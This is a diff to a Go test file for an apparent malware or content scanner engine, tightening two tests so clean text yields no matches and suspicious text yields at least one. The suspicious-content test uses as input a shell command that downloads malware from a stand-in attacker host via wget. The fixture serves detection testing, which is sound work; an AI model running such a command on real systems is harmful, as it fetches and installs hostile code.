@@ -30,9 +30,8 @@ func TestScanCleanFile(t *testing.T) {
 	e := NewEngine()
 	e.LoadDefaultRules()
 
-	result := e.ScanBytes([]byte("hello world this is clean text"), "clean.txt")
-	if result == nil {
-		t.Fatal("expected non-nil result")
+	if result := e.ScanBytes([]byte("hello world this is clean text"), "clean.txt"); len(result) != 0 {
+		t.Errorf("expected no matches for clean text, got %d", len(result))
 	}
 }
 
@@ -40,9 +39,8 @@ func TestScanSuspiciousContent(t *testing.T) {
 	e := NewEngine()
 	e.LoadDefaultRules()
 
-	result := e.ScanBytes([]byte("/bin/sh -c wget http://evil.com/malware"), "suspicious.txt")
-	if result == nil {
-		t.Fatal("expected non-nil result")
+	if result := e.ScanBytes([]byte("/bin/sh -c wget http://evil.com/malware"), "suspicious.txt"); len(result) == 0 {
+		t.Error("expected at least one match for suspicious content")
 	}
 }
 
